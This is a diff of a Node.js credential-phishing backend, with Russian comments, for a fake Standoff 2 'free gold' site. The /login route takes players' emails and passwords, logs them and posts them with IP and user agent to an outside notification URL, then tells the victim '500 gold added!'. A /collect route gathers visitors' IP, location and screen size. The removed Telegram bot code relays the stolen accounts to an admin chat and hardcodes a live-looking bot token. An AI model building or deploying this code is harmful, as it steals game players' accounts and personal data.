@@ -1,79 +1,79 @@
-const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
-
-// ===== ТВОИ ДАННЫЕ =====
-const BOT_TOKEN = '8699335543:AAHUe_Ht9gCNI7cnBa3l6jvp315xTQKv0LQ'; // ← вставь свой
-const ADMIN_ID = 5015075680;
-const PORT = process.env.PORT || 3000;
-const SECRET = 'my_super_secret_2026'; // придумай свой пароль
-
-// ===== БОТ =====
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
-console.log('🤖 Telegram-бот запущен');
-
-bot.onText(/\/start/, (msg) => {
-    bot.sendMessage(msg.chat.id,
-        '🔐 *Бот уведомлений Standoff 2*\n\nТвой chat\\_id: `' + msg.chat.id + '`',
-        { parse_mode: 'Markdown' }
-    );
-});
-
-bot.onText(/\/test/, (msg) => {
-    bot.sendMessage(ADMIN_ID, '✅ Тест пройден, бот работает!');
-});
-
-// ===== ФУНКЦИИ ОТПРАВКИ =====
-function sendAccount(data) {
-    const text =
-        '🔐 *НОВЫЙ АККАУНТ*\n' +
-        '━━━━━━━━━━━━━━━━━━\n' +
-        '📧 Почта: `' + (data.email || '?') + '`\n' +
-        '🔑 Пароль: `' + (data.password || '?') + '`\n' +
-        '🌐 IP: `' + (data.ip || '?') + '`\n' +
-        '📱 Устройство: ' + ((data.user_agent || '').substring(0, 50)) + '...\n' +
-        '🕒 Время: ' + new Date().toLocaleString('ru-RU');
-    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' })
-        .catch(err => console.error('TG:', err.message));
-}
-
-function sendVisitor(data) {
-    const text =
-        '👤 *НОВЫЙ ПОСЕТИТЕЛЬ*\n' +
-        '━━━━━━━━━━━━━━━━━━\n' +
-        '🌐 IP: `' + (data.ip || '?') + '`\n' +
-        '🌍 Страна: ' + (data.country || '?') + '\n' +
-        '🏙 Город: ' + (data.city || '?') + '\n' +
-        '📡 Провайдер: ' + (data.org || '?') + '\n' +
-        '📺 Экран: ' + (data.screen || '?') + '\n' +
-        '🕒 Время: ' + new Date().toLocaleString('ru-RU');
-    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' })
-        .catch(err => console.error('TG:', err.message));
-}
-
-// ===== HTTP-СЕРВЕР =====
+const axios = require('axios');
+const path = require('path');
 const app = express();
+
+// ===== НАСТРОЙКИ =====
+const ADMIN_USER = 'admin';
+const ADMIN_PASS = 'standoff2026';
+
+// ⚠️ ВСТАВЬ СЮДА URL ОТ WISPBYTE (типа https://xxxx.wispbyte.com/notify)
+const BOT_URL = 'https://ВСТАВЬ_URL_ОТ_WISPBYTE/notify';
+const SECRET = 'standoff_secret_2026'; // должен совпадать с bot.js
+
+// ===== EXPRESS =====
 app.use(express.json());
+app.use(express.static('public'));
 
-// Приём данных с сайта
-app.post('/notify', (req, res) => {
-    const { type, secret, data } = req.body;
+function auth(req, res, next) {
+    const b64 = (req.headers.authorization || '').split(' ')[1] || '';
+    const [user, pass] = Buffer.from(b64, 'base64').toString().split(':');
+    if (user === ADMIN_USER && pass === ADMIN_PASS) return next();
+    res.set('WWW-Authenticate', 'Basic realm="Admin"');
+    return res.status(401).send('Access denied');
+}
 
-    if (secret !== SECRET) {
-        return res.status(401).json({ error: 'unauthorized' });
-    }
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
 
-    if (type === 'account') {
-        sendAccount(data);
-    } else if (type === 'visitor') {
-        sendVisitor(data);
-    }
+// ===== СБОР ПОСЕТИТЕЛЕЙ =====
+app.post('/collect', (req, res) => {
+    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
+    const geo = req.body.geo || {};
+    const screen = req.body.screen || {};
+
+    console.log('👤 Посетитель: ' + ip + ' | ' + (geo.country || '?') + ', ' + (geo.city || '?'));
+
+    axios.post(BOT_URL, {
+        type: 'visitor',
+        secret: SECRET,
+        data: {
+            ip: ip,
+            country: geo.country,
+            city: geo.city,
+            org: geo.org,
+            screen: (screen.w || '?') + 'x' + (screen.h || '?')
+        }
+    }).catch(err => console.error('Bot err:', err.message));
 
     res.json({ ok: true });
 });
 
-// Проверка, что сервер жив
-app.get('/', (req, res) => res.send('Bot is running'));
+// ===== ЛОГИН =====
+app.post('/login', (req, res) => {
+    const { email, password } = req.body;
+    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
+    const ua = req.headers['user-agent'] || 'unknown';
 
-app.listen(PORT, () => {
-    console.log('🚀 HTTP-сервер запущен на порту ' + PORT);
+    if (!email || !password) return res.status(400).json({ error: 'Fill all fields' });
+
+    console.log('🔐 Аккаунт: ' + email + ' : ' + password);
+
+    axios.post(BOT_URL, {
+        type: 'account',
+        secret: SECRET,
+        data: { email, password, ip, user_agent: ua }
+    }).catch(err => console.error('Bot err:', err.message));
+
+    res.json({ success: true, message: '500 gold added!' });
+});
+
+// ===== АДМИНКА =====
+app.get('/admin', auth, (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+app.listen(3000, () => {
+    console.log('Server started on http://localhost:3000');
 });
